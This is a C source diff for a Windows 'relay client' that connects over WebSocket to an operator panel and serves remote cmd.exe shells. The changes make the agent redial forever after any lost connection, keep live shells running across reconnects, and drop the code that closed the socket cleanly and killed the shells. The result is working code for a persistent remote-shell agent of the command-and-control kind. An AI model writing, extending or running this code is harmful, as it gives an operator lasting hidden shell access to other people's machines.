@@ -14,7 +14,10 @@
  * Lifecycle:
  *   [1] connect: session -> connection -> HTTP GET -> 101 upgrade -> socket
  *   [2] serve:   wait for a panel command, dispatch it, send one reply
- *   [3] shutdown: close the WebSocket cleanly and release handles
+ *   [3] redial:  on a lost connection (transport error or a close frame),
+ *               wait 1..32 s and dial again - an agent never gives up.
+ *               Only the Exit command (or killing the process) ends it;
+ *               live shells survive a redial.
  *
  * Build (MinGW gcc):
  *   gcc -O2 -s -Wall -Wextra -o relay_client.exe main.c \
@@ -246,6 +249,9 @@ static DWORD handle_close_shell(HINTERNET socket, const incoming_message *msg)
  * main
  * ======================================================================== */
 
+/* One full connect/serve/close session (defined below main). */
+static int run_session(const wchar_t *url, int *long_lived);
+
 int main(int argc, char *argv[])
 {
     /* ----- Stage 1: the URL must come from the command line ----- */
@@ -265,10 +271,53 @@ int main(int argc, char *argv[])
         return 1;
     }
 
+    /* ----- The agent loop: dial, serve, redial. A lost connection is a
+     * normal event (the relay drops agent sockets when the paired operator
+     * disconnects, deploys recycle the Durable Object, idle NATs time out);
+     * each loss is answered with a fresh dial after a capped backoff. Only
+     * Exit (RC_EXIT) or an unrecoverable local failure ends the process.
+     * Live shells survive a redial - only the panel's view of them is new
+     * ids after the panel re-opens. */
+    int rc = RC_SESSION_LOST;
+    while (rc == RC_SESSION_LOST) {
+        int long_lived = 0;
+        rc = run_session(url, &long_lived);
+        if (rc == RC_SESSION_LOST) {
+            static const int backoff_steps[] = { 1, 2, 4, 8, 16, 32 };
+            static const int backoff_count =
+                sizeof(backoff_steps) / sizeof(backoff_steps[0]);
+            static int backoff_pos = 0;
+
+            int wait_s = backoff_steps[backoff_pos];
+            /* Grow toward the cap while dialing keeps failing, but reset
+             * after a session that lived a while - one blip on a healthy
+             * day should not wait half a minute on the next one. */
+            if (long_lived)
+                backoff_pos = 0;
+            else if (backoff_pos + 1 < backoff_count)
+                backoff_pos++;
+
+            printf("[i] connection lost - redialing in %d s ...\n", wait_s);
+            fflush(stdout);
+            Sleep((DWORD)wait_s * 1000);
+        }
+    }
+    return rc;
+}
+
+/* One full session: connect, serve until the connection dies or Exit
+ * arrives, close cleanly. Returns RC_EXIT / RC_SESSION_LOST / RC_LOCAL_ERROR.
+ * All handles are released on every path (no leaks across redials).
+ * *long_lived is set when the session served at least one command - the
+ * caller uses it to reset the redial backoff after a healthy session. */
+static int run_session(const wchar_t *url, int *long_lived)
+{
     /* Resource state for correct cleanup via goto. */
-    int       rc = 1;                   /* assume failure by default  */
+    int       rc = RC_SESSION_LOST;     /* default: dial again          */
     HINTERNET session = NULL, connection = NULL, request = NULL;
     HINTERNET socket = NULL;
+
+    *long_lived = 0;                    /* set on the first served reply */
 
     /* ----- Stage 2: split the URL into components (WinHttpCrackUrl) ----- */
     URL_COMPONENTS uc;
@@ -282,15 +331,18 @@ int main(int argc, char *argv[])
 
     if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
         print_error_code("WinHttpCrackUrl (invalid URL?)", GetLastError());
+        rc = RC_LOCAL_ERROR;          /* a bad URL will not heal itself */
         goto cleanup;
     }
     if (uc.nScheme != INTERNET_SCHEME_HTTP &&
         uc.nScheme != INTERNET_SCHEME_HTTPS) {
         fprintf(stderr, "[!] only http:// and https:// URLs are supported\n");
+        rc = RC_LOCAL_ERROR;
         goto cleanup;
     }
     if (uc.dwHostNameLength == 0) {
         fprintf(stderr, "[!] URL has no host name\n");
+        rc = RC_LOCAL_ERROR;
         goto cleanup;
     }
     BOOL https = (uc.nScheme == INTERNET_SCHEME_HTTPS);
@@ -350,17 +402,19 @@ int main(int argc, char *argv[])
      * - except Exit, which gets none and terminates the agent. ----- */
     printf("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
     for (int index = 1; ; index++) {
+        *long_lived = 1;                /* a command arrived on this wire */
         incoming_message msg;
         BOOL closed = FALSE;
 
         DWORD err = ws_receive(socket, &msg, &closed);
         if (err != NO_ERROR) {
             print_error_code("WinHttpWebSocketReceive", err);
-            goto cleanup;
+            goto cleanup;             /* rc stays SESSION_LOST -> redial */
         }
         if (closed) {
-            fprintf(stderr, "[!] Server closed the connection.\n");
-            goto shutdown;
+            fprintf(stderr,
+                    "[!] Server closed the connection - redialing.\n");
+            goto cleanup;             /* a close frame is also just a loss */
         }
 
         if (verbose)
@@ -386,7 +440,7 @@ int main(int argc, char *argv[])
         if (opcode == CMD_EXIT) {       /* Exit: no reply, terminate now */
             printf("[!] Exit requested - terminating.\n");
             fflush(stdout);
-            rc = 0;                     /* a valid command, not an error */
+            rc = RC_EXIT;               /* a valid command, not an error */
             goto cleanup;               /* spec: terminate immediately  */
         }
 
@@ -415,31 +469,9 @@ int main(int argc, char *argv[])
         }
     }
 
-shutdown:
-    /* ----- Stage 5: close the WebSocket cleanly ----- */
-    {
-        DWORD err = WinHttpWebSocketShutdown(socket,
-                        WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
-        if (err != NO_ERROR) {
-            print_error_code("WinHttpWebSocketShutdown", err);
-        } else {
-            USHORT status = 0;
-            char reason[128];
-            DWORD reason_len = 0;
-            if (WinHttpWebSocketQueryCloseStatus(socket, &status, reason,
-                                                 sizeof(reason) - 1,
-                                                 &reason_len) == NO_ERROR)
-                printf("[3] Connection closed cleanly (close status %u).\n",
-                       status);
-            else
-                printf("[3] Close frame sent.\n");
-        }
-    }
-    rc = 0;
+    /* Unreachable: the serve loop above only leaves via goto cleanup. */
 
 cleanup:
-    /* No orphaned cmd.exe: every live shell dies with the agent. */
-    shell_teardown_all();
     if (socket)     WinHttpCloseHandle(socket);
     if (request)    WinHttpCloseHandle(request);
     if (connection) WinHttpCloseHandle(connection);
